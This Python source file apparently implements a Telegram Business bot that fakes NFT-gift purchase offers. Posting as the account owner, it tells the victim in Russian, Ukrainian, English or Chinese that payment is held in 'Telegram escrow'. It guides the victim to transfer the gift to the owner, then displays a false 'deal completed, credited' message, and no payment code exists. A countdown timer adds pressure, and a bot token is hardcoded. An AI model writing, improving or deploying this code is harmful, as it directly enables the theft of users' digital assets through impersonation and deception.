import asyncio, re, random, string, logging, time
from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from aiogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton,
    LinkPreviewOptions, BusinessConnection, CallbackQuery,
)
from aiogram.exceptions import TelegramBadRequest

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(message)s",
)

BOT_TOKEN = "8516600626:AAHkWQ2mdcqPfzR5gNe_a5uMfZB13y7P8-A"
OFFER_TTL = 6 * 3600  # 6 часов в секундах
TIMER_TICK = 60  # опрос раз в минуту
TIMER_MIN_EDIT_GAP = 60  # редактировать сообщение не чаще раза в 60 сек
RECENT_CLICK_GRACE = 10  # после клика не трогать 10 сек

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

GIFT_RE = re.compile(r"t\.me/nft/([A-Za-z]+?)-(\d+)")
LANG_TAGS = {"ru", "ukr", "eng", "cn", "en", "uk", "zh"}
CMD_WORDS = {"buy", "sell", "offer", "deal", "купить", "продать"}

E_STAR, E_GEM, E_CHECK = (
    "6028338546736107668",
    "5318901904686754959",
    "5774022692642492953",
)

BIZ_OWNERS: dict[str, dict] = {}
PENDING: dict[str, dict] = {}
GIFT_INDEX: dict[tuple, str] = {}


def em(i, f):
    return f'<tg-emoji emoji-id="{i}">{f}</tg-emoji>'


T = {
    "ru": {
        "o1": "Пользователь предлагает вам",
        "of": "за подарок",
        "ot_h": "Оффер действителен ещё <b>{h} ч.</b>",
        "ot_hm": "Оффер действителен ещё <b>{h} ч. {m} мин.</b>",
        "ot_m": "Оффер действителен ещё <b>{m} мин.</b>",
        "ot_exp": "Срок оффера истёк.",
        "accept": "Принять",
        "decline": "Отклонить",
        "transfer": "Передать NFT",
        "confirm": "Подтвердить передачу",
        "alert": (
            "⚠️ Следуйте инструкции внимательно.\n\n"
            "Если вы передадите другой подарок или ошибётесь при подтверждении, "
            "Telegram не вернёт средства и не зачислит оплату автоматически.\n\n"
            "Если вы ознакомились, нажмите «Ок»."
        ),
        "instr_title": "Покупатель зарезервировал",
        "instr_via": "через эскроу-систему Telegram.",
        "instr_body": (
            "Средства хранятся на специальном эскроу-счёте и будут автоматически "
            "зачислены на ваш баланс Telegram Stars сразу после передачи подарка."
        ),
        "instr_head": "Инструкция для завершения сделки:",
        "instr_s1": "1. Передайте подарок пользователю:",
        "instr_s2": "2. Нажмите «Передать NFT» и выберите",
        "instr_s3": "3. Подтвердите передачу подарка.",
        "instr_foot_1": "Telegram зафиксирует транзакцию и моментально зачислит",
        "instr_foot_2": "на ваш баланс. Резерв действует 24 часа.",
        "err_not_received": "❌ Ошибка: товар не получен. Попробуйте передать и подтвердить ещё раз.",
        "done_t": "Сделка завершена!",
        "done_b": "Ордер {oid} выполнен.",
        "done_credit": "зачислено на баланс.",
        "declined": "Оффер отклонён.",
        "expired": "⌛ Срок оффера истёк.",
        "order_lbl": "Ордер",
    },
    "ukr": {
        "o1": "Користувач пропонує вам",
        "of": "за подарунок",
        "ot_h": "Пропозиція дійсна ще <b>{h} год.</b>",
        "ot_hm": "Пропозиція дійсна ще <b>{h} год. {m} хв.</b>",
        "ot_m": "Пропозиція дійсна ще <b>{m} хв.</b>",
        "ot_exp": "Термін пропозиції минув.",
        "accept": "Прийняти",
        "decline": "Відхилити",
        "transfer": "Передати NFT",
        "confirm": "Підтвердити передачу",
        "alert": (
            "⚠️ Дотримуйтесь інструкції уважно.\n\n"
            "Якщо ви передасте інший подарунок або помилитесь при підтвердженні, "
            "Telegram не поверне кошти і не зарахує оплату автоматично.\n\n"
            "Якщо ви ознайомились, натисніть «Ок»."
        ),
        "instr_title": "Покупець зарезервував",
        "instr_via": "через ескроу-систему Telegram.",
        "instr_body": (
            "Кошти зберігаються на спеціальному ескроу-рахунку і будуть автоматично "
            "зараховані на ваш баланс Telegram Stars одразу після передачі подарунка."
        ),
        "instr_head": "Інструкція для завершення угоди:",
        "instr_s1": "1. Передайте подарунок користувачу:",
        "instr_s2": "2. Натисніть «Передати NFT» і виберіть",
        "instr_s3": "3. Підтвердіть передачу подарунка.",
        "instr_foot_1": "Telegram зафіксує транзакцію і миттєво зарахує",
        "instr_foot_2": "на ваш баланс. Резерв діє 24 години.",
        "err_not_received": "❌ Помилка: товар не отримано. Спробуйте передати і підтвердити ще раз.",
        "done_t": "Угоду завершено!",
        "done_b": "Ордер {oid} виконано.",
        "done_credit": "зараховано на баланс.",
        "declined": "Пропозицію відхилено.",
        "expired": "⌛ Термін пропозиції минув.",
        "order_lbl": "Ордер",
    },
    "eng": {
        "o1": "A user offers you",
        "of": "for the gift",
        "ot_h": "Offer valid for another <b>{h} h.</b>",
        "ot_hm": "Offer valid for another <b>{h} h. {m} min.</b>",
        "ot_m": "Offer valid for another <b>{m} min.</b>",
        "ot_exp": "Offer expired.",
        "accept": "Accept",
        "decline": "Decline",
        "transfer": "Transfer NFT",
        "confirm": "Confirm transfer",
        "alert": (
            "⚠️ Follow the instructions carefully.\n\n"
            "If you send the wrong gift or confirm by mistake, Telegram will not "
            "return the funds and will not credit the payment automatically.\n\n"
            "If you understand, press «OK»."
        ),
        "instr_title": "The buyer has reserved",
        "instr_via": "via Telegram escrow.",
        "instr_body": (
            "Funds are held in a dedicated escrow account and will be credited to "
            "your Telegram Stars balance automatically right after the gift is sent."
        ),
        "instr_head": "Instructions to complete the deal:",
        "instr_s1": "1. Send the gift to the user:",
        "instr_s2": "2. Press «Transfer NFT» and choose",
        "instr_s3": "3. Confirm the transfer.",
        "instr_foot_1": "Telegram will record the transaction and instantly credit",
        "instr_foot_2": "to your balance. Reservation is valid for 24 hours.",
        "err_not_received": "❌ Error: gift not received. Try sending and confirming again.",
        "done_t": "Deal completed!",
        "done_b": "Order {oid} fulfilled.",
        "done_credit": "credited to your balance.",
        "declined": "Offer declined.",
        "expired": "⌛ Offer expired.",
        "order_lbl": "Order",
    },
    "cn": {
        "o1": "用户向您提出报价",
        "of": "购买礼物",
        "ot_h": "报价还有效 <b>{h} 小时</b>",
        "ot_hm": "报价还有效 <b>{h} 小时 {m} 分</b>",
        "ot_m": "报价还有效 <b>{m} 分</b>",
        "ot_exp": "报价已过期。",
        "accept": "接受",
        "decline": "拒绝",
        "transfer": "转移 NFT",
        "confirm": "确认转移",
        "alert": (
            "⚠️ 请严格按照说明操作。\n\n"
            "如果您发送了错误的礼物或错误地确认，Telegram 将不会退还资金，"
            "也不会自动记入付款。\n\n"
            "如果您已了解，请点击「确定」。"
        ),
        "instr_title": "买家已预留",
        "instr_via": "通过 Telegram 托管系统。",
        "instr_body": (
            "资金保存在专用托管账户中，礼物转移后将自动记入您的 Telegram Stars 余额。"
        ),
        "instr_head": "完成交易的说明：",
        "instr_s1": "1. 将礼物转移给用户：",
        "instr_s2": "2. 点击「转移 NFT」并选择",
        "instr_s3": "3. 确认礼物的转移。",
        "instr_foot_1": "Telegram 将记录交易并立即将",
        "instr_foot_2": "记入您的余额。预留有效期为 24 小时。",
        "err_not_received": "❌ 错误：未收到礼物。请再次尝试转移并确认。",
        "done_t": "交易完成！",
        "done_b": "订单 {oid} 已完成。",
        "done_credit": "已记入余额。",
        "declined": "报价已拒绝。",
        "expired": "⌛ 报价已过期。",
        "order_lbl": "订单",
    },
}


def t(l, k):
    return T.get(l, T["ru"]).get(k, T["ru"][k])


def fmt_remaining(expires_at: float, lang: str) -> str:
    left = int(expires_at - time.time())
    if left <= 0:
        return t(lang, "ot_exp")
    h, rem = divmod(left, 3600)
    m, _ = divmod(rem, 60)
    if h > 0 and m > 0:
        return t(lang, "ot_hm").format(h=h, m=m)
    if h > 0:
        return t(lang, "ot_h").format(h=h)
    return t(lang, "ot_m").format(m=max(m, 1))


def get_recipient(bcid: str) -> tuple[str | None, int | None]:
    info = BIZ_OWNERS.get(bcid)
    if not info:
        return None, None
    return info.get("username"), info.get("user_id")


def parse_command(text):
    if not text:
        return None
    parts = text.strip().split()
    if not parts:
        return None

    # дропаем префикс команды: /buy .buy !buy @bot buy — всё в утиль
    first = parts[0].lstrip("/.!")
    if first.lower() in CMD_WORDS or parts[0].startswith(("/", ".", "!")):
        parts = parts[1:]
    if parts and parts[0].startswith("@"):
        parts = parts[1:]
    # на случай ".buy" где первый токен сдроплен, но следом ещё "buy"
    if parts and parts[0].lower() in CMD_WORDS:
        parts = parts[1:]
    if not parts:
        return None

    link, amount = None, None
    currency, lang = "STARS", "ru"

    for p in parts:
        low = p.lower()
        if link is None and (p.startswith("http") or p.startswith("t.me") or "t.me/" in p):
            # нормализуем: добавим https:// если нет
            link = p if p.startswith("http") else f"https://{p}"
            continue
        if low in LANG_TAGS:
            if low == "ru":
                lang = "ru"
            elif low in ("ukr", "uk"):
                lang = "ukr"
            elif low in ("eng", "en"):
                lang = "eng"
            elif low in ("cn", "zh"):
                lang = "cn"
            continue
        if low == "gram":
            currency = "GRAM"
            continue
        if low in ("stars", "star", "звёзд", "звезд", "звёзды", "звезды"):
            currency = "STARS"
            continue
        if amount is None:
            try:
                amount = int(float(p.replace(",", ".")))
            except ValueError:
                pass

    if not link or amount is None:
        return None
    return link, amount, currency, lang


def parse_gift(link):
    m = GIFT_RE.search(link)
    if not m:
        return None
    slug, num = m.group(1), m.group(2)
    name = re.sub(r"(?<!^)(?=[A-Z])", " ", slug)
    return name, num, slug


def amount_only(amount, currency):
    icon = em(E_GEM, "💎") if currency == "GRAM" else em(E_STAR, "⭐")
    return f'<b>{amount}</b> {icon}'


def build_offer_short(amount, currency, gift_name, gift_num, lang, expires_at, url=None):
    gift_part = (
        f'<b><a href="{url}">{gift_name} #{gift_num}</a></b>'
        if url else f'<b>{gift_name} #{gift_num}</b>'
    )
    return (
        f'{t(lang, "o1")} {amount_only(amount, currency)} '
        f'{t(lang, "of")} {gift_part}.\n\n'
        f'{fmt_remaining(expires_at, lang)}'
    )


def build_instruction(amount, currency, gift_name, gift_num, order_id, lang, username, user_id, nft_url, expires_at):
    rec = f"@{username}" if username else (
        f'<a href="tg://user?id={user_id}">id{user_id}</a>' if user_id else "—"
    )
    gift_link = f'<b><a href="{nft_url}">{gift_name} #{gift_num}</a></b>'
    # БЕЗ таймера в конце и БЕЗ # перед order_id
    return (
        f'<i>{t(lang, "order_lbl")} {order_id}</i>\n\n'
        f'{t(lang, "instr_title")} {amount_only(amount, currency)} '
        f'{t(lang, "instr_via")} {t(lang, "instr_body")}\n\n'
        f'<b>{t(lang, "instr_head")}</b>\n'
        f'{t(lang, "instr_s1")} {rec}\n'
        f'{t(lang, "instr_s2")} {gift_link}\n'
        f'{t(lang, "instr_s3")}\n\n'
        f'{t(lang, "instr_foot_1")} {amount_only(amount, currency)} '
        f'{t(lang, "instr_foot_2")}'
    )


def build_accepted(amount, currency, order_id, lang):
    return (
        f'{em(E_CHECK, "✅")} <b>{t(lang, "done_t")}</b>\n\n'
        f'{t(lang, "done_b").format(oid=order_id)}\n'
        f'{amount_only(amount, currency)} {t(lang, "done_credit")}'
    )


def build_declined(lang):
    return f'❌ {t(lang, "declined")}'


def build_expired(lang):
    return t(lang, "expired")


def kb_offer(lang, order_id):
    return InlineKeyboardMarkup(
        inline_keyboard=[[
            InlineKeyboardButton(text=t(lang, "decline"), callback_data=f"decline:{order_id}"),
            InlineKeyboardButton(text=t(lang, "accept"), callback_data=f"accept:{order_id}"),
        ]]
    )


def kb_instruction(lang, order_id, username, user_id):
    if username:
        send_url = f"tg://send_gift?to={username}"
    elif user_id:
        send_url = f"tg://user?id={user_id}"
    else:
        send_url = "tg://settings"
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=f'{t(lang, "transfer")} ↗', url=send_url)],
            [InlineKeyboardButton(text=t(lang, "confirm"), callback_data=f"confirm:{order_id}")],
        ]
    )


def oid():
    return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))


def extract_gift_ref(message: Message):
    for attr in ("unique_gift", "gift"):
        obj = getattr(message, attr, None)
        if obj is None:
            continue
        g = getattr(obj, "gift", obj)
        name = getattr(g, "name", None) or getattr(g, "title", None)
        num = getattr(g, "number", None)
        if name and num is not None:
            slug = name.replace(" ", "")
            return slug, str(num)

    txt = (message.text or message.caption or "")
    m = GIFT_RE.search(txt)
    if m:
        return m.group(1), m.group(2)

    for ent_list in (message.entities or [], message.caption_entities or []):
        for ent in ent_list:
            url = getattr(ent, "url", None) or ""
            m = GIFT_RE.search(url)
            if m:
                return m.group(1), m.group(2)

    return None


async def mark_gift_transferred(message: Message, bcid: str):
    ref = extract_gift_ref(message)
    if not ref:
        return False
    slug, num = ref
    order_id = GIFT_INDEX.get((bcid, slug, num))
    if not order_id:
        return False
    meta = PENDING.get(order_id)
    if not meta:
        return False
    meta["gift_transferred"] = True
    logging.info(f"gift transferred for order {order_id}")
    return True


async def ensure_owner(bcid: str):
    if bcid in BIZ_OWNERS:
        return
    try:
        bc = await bot.get_business_connection(bcid)
        BIZ_OWNERS[bcid] = {
            "username": bc.user.username,
            "user_id": bc.user.id,
        }
        logging.info(f"biz_conn FETCHED: bcid={bcid} user={bc.user.username}")
    except Exception as e:
        logging.error(f"get_business_connection failed: {e}")


async def render_offer(meta: dict, order_id: str, with_preview: bool):
    """Перерисовать оффер в текущем состоянии (OFFER/ALERT_SHOWN или INSTRUCTION)."""
    lang = meta["lang"]
    state = meta["state"]
    try:
        if state in ("OFFER", "ALERT_SHOWN"):
            text = build_offer_short(
                meta["amount"], meta["currency"],
                meta["gift_name"], meta["gift_num"],
                lang, meta["expires_at"],
                meta["nft_url"] if with_preview else None,
            )
            kb = kb_offer(lang, order_id)
            lpo = LinkPreviewOptions(
                is_disabled=not with_preview,
                prefer_large_media=True,
                show_above_text=True,
            )
        else:  # INSTRUCTION
            text = build_instruction(
                meta["amount"], meta["currency"],
                meta["gift_name"], meta["gift_num"],
                order_id, lang,
                meta["username"], meta["user_id"],
                meta["nft_url"], meta["expires_at"],
            )
            kb = kb_instruction(lang, order_id, meta["username"], meta["user_id"])
            lpo = LinkPreviewOptions(
                is_disabled=False,
                prefer_large_media=True,
                show_above_text=True,
            )

        await bot.edit_message_text(
            chat_id=meta["chat_id"],
            message_id=meta["msg_id"],
            text=text,
            reply_markup=kb,
            business_connection_id=meta["bcid"],
            link_preview_options=lpo,
        )
    except TelegramBadRequest as e:
        # "message is not modified" — норм, пропускаем
        if "not modified" not in str(e):
            logging.error(f"render_offer edit: {e}")


async def timer_loop():
    """Фоновый таск: обновляет таймер и чистит протухшие офферы."""
    while True:
        try:
            now = time.time()
            dead = []
            for order_id, meta in list(PENDING.items()):
                if meta["expires_at"] <= now:
                    dead.append(order_id)
                    continue
                # таймер показывается только на карточке оффера (до "Принять")
                if meta["state"] not in ("OFFER", "ALERT_SHOWN"):
                    continue
                last_click = meta.get("last_click_at", 0)
                if now - last_click < RECENT_CLICK_GRACE:
                    continue
                last_edit = meta.get("last_edit_at", 0)
                if now - last_edit < TIMER_MIN_EDIT_GAP:
                    continue

                with_preview = meta.get("preview_shown", False)
                await render_offer(meta, order_id, with_preview)
                meta["last_edit_at"] = time.time()
                await asyncio.sleep(0.05)

            for order_id in dead:
                meta = PENDING.pop(order_id, None)
                if not meta:
                    continue
                GIFT_INDEX.pop((meta["bcid"], meta["gift_slug"], meta["gift_num"]), None)
                try:
                    await bot.edit_message_text(
                        chat_id=meta["chat_id"],
                        message_id=meta["msg_id"],
                        text=build_expired(meta["lang"]),
                        reply_markup=None,
                        business_connection_id=meta["bcid"],
                        link_preview_options=LinkPreviewOptions(is_disabled=True),
                    )
                except Exception as e:
                    logging.error(f"expire edit: {e}")
        except Exception as e:
            logging.error(f"timer_loop: {e}")

        await asyncio.sleep(TIMER_TICK)


@dp.business_connection()
async def handle_business_connection(bc: BusinessConnection):
    user = bc.user
    if bc.is_enabled:
        BIZ_OWNERS[bc.id] = {
            "username": user.username,
            "user_id": user.id,
        }
        logging.info(f"biz_conn ON: bcid={bc.id} user={user.username}")
    else:
        BIZ_OWNERS.pop(bc.id, None)
        logging.info(f"biz_conn OFF: bcid={bc.id}")


@dp.business_message()
async def handle_business_message(message: Message):
    bcid = message.business_connection_id
    if not bcid:
        return

    await ensure_owner(bcid)

    if await mark_gift_transferred(message, bcid):
        return

    if not message.text:
        return

    parsed = parse_command(message.text)
    if not parsed:
        logging.info(f"not parsed: {message.text!r}")
        return

    username, user_id = get_recipient(bcid)
    if not username and not user_id:
        logging.warning(f"no owner info for bcid={bcid}, skipping offer")
        return

    link, amount, currency, lang = parsed
    gift = parse_gift(link)
    if not gift:
        logging.info(f"gift not parsed from: {link}")
        return
    gift_name, gift_num, slug = gift
    nft_url = f"https://t.me/nft/{slug}-{gift_num}"
    order_id = oid()
    expires_at = time.time() + OFFER_TTL

    logging.info(f"new offer {order_id}: {gift_name}#{gift_num} for {amount} {currency}")

    try:
        sent = await bot.send_message(
            chat_id=message.chat.id,
            text=build_offer_short(amount, currency, gift_name, gift_num, lang, expires_at),
            reply_markup=kb_offer(lang, order_id),
            business_connection_id=bcid,
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
    except Exception as e:
        logging.error(f"send error: {e}")
        return

    try:
        await bot.delete_business_messages(
            business_connection_id=bcid,
            message_ids=[message.message_id],
        )
    except Exception as e:
        logging.error(f"del: {e}")

    PENDING[order_id] = {
        "chat_id": message.chat.id,
        "msg_id": sent.message_id,
        "bcid": bcid,
        "amount": amount,
        "currency": currency,
        "gift_name": gift_name,
        "gift_num": gift_num,
        "gift_slug": slug,
        "lang": lang,
        "nft_url": nft_url,
        "username": username,
        "user_id": user_id,
        "state": "OFFER",
        "gift_transferred": False,
        "expires_at": expires_at,
        "preview_shown": False,
    }
    GIFT_INDEX[(bcid, slug, gift_num)] = order_id

    # ШАГ 2: добавляем превью
    await asyncio.sleep(0.8)
    try:
        await bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=sent.message_id,
            text=build_offer_short(amount, currency, gift_name, gift_num, lang, expires_at, nft_url),
            reply_markup=kb_offer(lang, order_id),
            business_connection_id=bcid,
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                prefer_large_media=True,
                show_above_text=True,
            ),
        )
        PENDING[order_id]["preview_shown"] = True
    except TelegramBadRequest as e:
        logging.error(f"preview edit: {e}")


@dp.edited_business_message()
async def handle_edited_business_message(message: Message):
    bcid = message.business_connection_id
    if not bcid:
        return
    await mark_gift_transferred(message, bcid)


def resolve_bcid(cb: CallbackQuery, meta: dict | None) -> str | None:
    if meta:
        return meta["bcid"]
    msg = cb.message
    return getattr(msg, "business_connection_id", None) if msg else None


@dp.callback_query(F.data.startswith("decline:"))
async def on_decline(cb: CallbackQuery):
    order_id = cb.data.split(":", 1)[1]
    logging.info(f"CB decline: order={order_id} from={cb.from_user.id}")
    meta = PENDING.get(order_id)
    if not meta:
        await cb.answer()
        return
    meta["last_click_at"] = time.time()
    lang = meta["lang"]
    try:
        await bot.edit_message_text(
            chat_id=meta["chat_id"],
            message_id=meta["msg_id"],
            text=build_declined(lang),
            reply_markup=None,
            business_connection_id=meta["bcid"],
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
    except TelegramBadRequest as e:
        logging.error(f"decline edit: {e}")
    PENDING.pop(order_id, None)
    GIFT_INDEX.pop((meta["bcid"], meta["gift_slug"], meta["gift_num"]), None)
    await cb.answer()


@dp.callback_query(F.data.startswith("accept:"))
async def on_accept(cb: CallbackQuery):
    order_id = cb.data.split(":", 1)[1]
    logging.info(f"CB accept: order={order_id} from={cb.from_user.id} state={PENDING.get(order_id, {}).get('state')}")
    meta = PENDING.get(order_id)
    if not meta:
        await cb.answer()
        return
    meta["last_click_at"] = time.time()
    lang = meta["lang"]

    # СНАЧАЛА показываем модальный alert — чтоб точно вылез даже если edit тупит
    await cb.answer(t(lang, "alert"), show_alert=True)

    # уже в инструкции — не редактируем повторно
    if meta["state"] == "INSTRUCTION":
        return

    # ПОТОМ разворачиваем сообщение в инструкцию
    try:
        await bot.edit_message_text(
            chat_id=meta["chat_id"],
            message_id=meta["msg_id"],
            text=build_instruction(
                meta["amount"], meta["currency"],
                meta["gift_name"], meta["gift_num"],
                order_id, lang,
                meta["username"], meta["user_id"],
                meta["nft_url"], meta["expires_at"],
            ),
            reply_markup=kb_instruction(lang, order_id, meta["username"], meta["user_id"]),
            business_connection_id=meta["bcid"],
            link_preview_options=LinkPreviewOptions(
                is_disabled=False,
                prefer_large_media=True,
                show_above_text=True,
            ),
        )
        meta["state"] = "INSTRUCTION"
        meta["last_edit_at"] = time.time()
    except TelegramBadRequest as e:
        logging.error(f"accept->instruction edit: {e}")


@dp.callback_query(F.data.startswith("confirm:"))
async def on_confirm(cb: CallbackQuery):
    order_id = cb.data.split(":", 1)[1]
    logging.info(f"CB confirm: order={order_id} from={cb.from_user.id}")
    meta = PENDING.get(order_id)
    if not meta:
        await cb.answer()
        return
    meta["last_click_at"] = time.time()
    lang = meta["lang"]

    if not meta.get("gift_transferred"):
        await cb.answer(t(lang, "err_not_received"), show_alert=True)
        return

    try:
        await bot.edit_message_text(
            chat_id=meta["chat_id"],
            message_id=meta["msg_id"],
            text=build_accepted(meta["amount"], meta["currency"], order_id, lang),
            reply_markup=None,
            business_connection_id=meta["bcid"],
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
    except TelegramBadRequest as e:
        logging.error(f"confirm edit: {e}")

    PENDING.pop(order_id, None)
    GIFT_INDEX.pop((meta["bcid"], meta["gift_slug"], meta["gift_num"]), None)
    await cb.answer()


@dp.callback_query()
async def on_any_cb(cb: CallbackQuery):
    """Фоллбэк: ловим ВСЕ callback'и для диагностики."""
    logging.warning(f"UNHANDLED CB: data={cb.data!r} from={cb.from_user.id}")
    await cb.answer()


@dp.message(CommandStart())
async def cmd_start(message: Message):
    await message.answer(
        "🎁 Пришли ссылку на подарок, язык и сумму, например:\n"
        ".buy https://t.me/nft/PreciousPeach-664 ru 21222"
    )


async def main():
    asyncio.create_task(timer_loop())
    await dp.start_polling(
        bot,
        allowed_updates=[
            "business_connection",
            "business_message",
            "edited_business_message",
            "callback_query",
        ],
    )


if __name__ == "__main__":
    asyncio.run(main())
